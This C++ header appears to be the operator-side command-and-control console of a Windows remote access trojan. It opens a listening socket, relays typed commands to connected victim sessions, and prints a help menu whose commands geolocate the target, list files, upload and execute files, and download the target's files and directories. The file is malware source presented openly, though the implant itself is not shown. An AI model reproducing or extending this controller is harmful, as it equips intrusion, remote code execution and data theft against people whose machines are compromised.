#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#define _WINSOCK_DEPCRECATED 
#pragma warning(disable:4996) 
#include <WinSock2.h>
#include <iostream>
#include <WS2tcpip.h>
#include <string.h>
#include <Windows.h>
#include "script.hpp"
#include <string>
#include <stdio.h>

/*
struct Client
{
	SOCKET sock;
	sockaddr_in addr;
};
*/

void t_recv(SOCKET sock)
{
	while (1)
	{
		char buffer[256] = { 0 };
		if (!(recv(sock, buffer, sizeof(buffer), 0)))
		{
			std::cout << "compare" << std::endl;
			compare_(buffer,sock);
		}
	}
}

void t_send(SOCKET &sock,bool* exit)
{
	char buffer[256] = { 0 };

	while ((strcmp(buffer, "exit")) != 0)
	{
		std::cout << ">> ";
		std::cin >> buffer;

		if (!(strcmp(buffer, "help")))
		{
			SetColor(2);
			std::cout << "				------------ List of Commands ------------" << std::endl;
			SetColor(6);
			std::cout << "help					     : list all commands" << std::endl;
			std::cout << "geo				         : Give the localization of the current session" << std::endl;
			std::cout << "set_session			     : Switch to an another session" << std::endl;
			std::cout << "list					     : list all actives sessions" << std::endl;
			std::cout << "exit					     : exit the program" << std::endl;
			std::cout << "pwd                        : print the trojan emplacement " << std::endl;
			std::cout << "cd \"\directory\..\"       : change directory" << std::endl;
			std::cout << "ls					     : see all files at the current directory" << std::endl;
			std::cout << "upload \"filename\"	     : upload a file in the current directory" << std::endl;
			std::cout << "upload_exe \"filename\"    : upload and exe a file in the current directory" << std::endl;
			std::cout << "download \"filename\"		 : download the file's target wanted  " << std::endl;
			std::cout << "download_dir \"filename\"  : download the target directory " << std::endl;
			SetColor(7);
		}
		else
		{
			std::cout << "compare" << std::endl;

			send(sock, buffer, sizeof(buffer), 0);
			//compare_(buffer, sock);
		}
		}
	*exit = 1;
}
 

SOCKET connection_server(const unsigned short port)
{
	SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (server == INVALID_SOCKET)
	{
		std::cout << "Erreur initialisation socket : " << WSAGetLastError();
		return -2;
	}
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	int res = bind(server, (sockaddr*)&addr, sizeof(addr));
	if (res != 0)
	{
		std::cout << "Error bind : " << WSAGetLastError();
		return -3;
	}

	res = listen(server, SOMAXCONN);
	if (res != 0)
	{
		std::cout << "Error listen : " << WSAGetLastError();
		return -4;
	}

	std::cout << "Server started on :  " << port << std::endl;
	return server;
}
/*
bool connection_server_accept(SOCKET &server,const unsigned short port,Client &NewClient)
{
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY; // indique que toutes les sources seront acceptées
	addr.sin_port = htons(port); // toujours penser à traduire le port en réseau
	addr.sin_family = AF_INET;
	sockaddr_in from = { 0 };
	socklen_t addrlen = sizeof(addr);
	SOCKET newClient = accept(server, (SOCKADDR*)(&from), &addrlen);
	if (newClient != INVALID_SOCKET)
	{
		char buff[INET6_ADDRSTRLEN] = { 0 };
		std::string clientAddress = inet_ntop(addr.sin_family, (void*)&(addr.sin_addr), buff, INET6_ADDRSTRLEN);
		std::cout << "New client accepted :  " << clientAddress.c_str() << ":" << addr.sin_port << std::endl;
		NewClient.sock = newClient;
		NewClient.addr = addr;
		return 1;
	}
	else
	{
		std::cout << "Error .." << std::endl;
		return 0;
	}
}

int connection_client(SOCKET &sock, const unsigned short port, const char* addr)
{
	SOCKADDR_IN sin;
	char buffer[256] = { 0 };
	int val;
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	sin.sin_addr.s_addr = inet_addr(addr);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	std::cout << "[*] Connection to " << addr << ":" << port << std::endl;
	val = connect(sock, (SOCKADDR *)&sin, sizeof(sin));

	if (val == INVALID_SOCKET)
	{
		return 0;
	}
	else
	{
		std::cout << "[*] Done" << std::endl;
		recv(sock, buffer, sizeof(buffer), 0);
		std::cout << "Server : " << buffer << std::endl;
		return 1;
	}
}
*/


